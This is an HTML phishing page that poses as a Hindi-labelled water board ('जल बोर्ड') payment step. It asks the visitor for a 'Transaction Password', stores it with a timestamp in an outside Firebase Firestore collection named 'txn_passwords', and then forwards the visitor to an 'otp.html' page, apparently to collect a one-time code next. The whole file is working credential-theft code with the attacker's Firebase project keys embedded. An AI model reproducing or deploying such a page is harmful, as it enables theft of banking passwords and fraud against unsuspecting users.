<!DOCTYPE html>
<html>
<head>
  <title>dehijlbrd</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <style>
    body {
      font-family: Arial;
      background-color: #FFFFFF;
      text-align: center;
      padding-top: 50px;
    }
    img {
      width: 90%;
      max-width: 300px;
      border-radius: 10px;
    }
    .side-button {
      margin-top: 20px;
      padding: 10px;
      width: 100%;
      font-size: 17px;
      background-color: #FF0000;
      color: #FFFFFF;
      border: none;
      border-radius: 10px;
    }
    .form-container {
      margin-top: 30px;
      text-align: left;
      width: 90%;
      max-width: 400px;
      margin-left: auto;
      margin-right: auto;
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .form-container h2 {
      text-align: center;
      background-color: #00008b;
      color: white;
      padding: 10px;
      border-radius: 5px;
    }
    .input-group {
      margin-bottom: 15px;
    }
    .input-group label {
      font-size: 16px;
      font-weight: bold;
      display: block;
      margin-bottom: 5px;
    }
    .input-group input {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <img src="https://i.ibb.co/s9ptXmZv/images-5.jpg" alt="Meri Tasveer">

  <div class="form-container">
    <h2>जल¥बोर्ड</h2>
    
    <form onsubmit="submitTxnPassword(event)">
      <div class="input-group">
        <label for="txn-pass">Transaction Password</label>
        <input type="password" id="txn-pass" name="txn-pass" placeholder="Enter your password" required>
      </div>

      <div style="text-align: center;">
        <button class="side-button" type="submit">Continue</button>
      </div>
    </form>
  </div>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
      authDomain: "dlhiljbrd.firebaseapp.com",
      projectId: "dlhiljbrd",
      storageBucket: "dlhiljbrd.firebasestorage.app",
      messagingSenderId: "981951131769",
      appId: "1:981951131769:web:5d56cd1423d753992664a8"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    function submitTxnPassword(e) {
      e.preventDefault();

      const pass = document.getElementById('txn-pass').value.trim();

      if (pass === "") {
        alert("Please enter your transaction password.");
        return false;
      }

      db.collection("txn_passwords").add({
        password: pass,
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
      }).then(() => {
        window.location.href = "otp.html"; // Change this to your actual next page file
      }).catch((error) => {
        alert("Error saving to Firebase: " + error);
      });
    }
  </script>
</body>
</html>
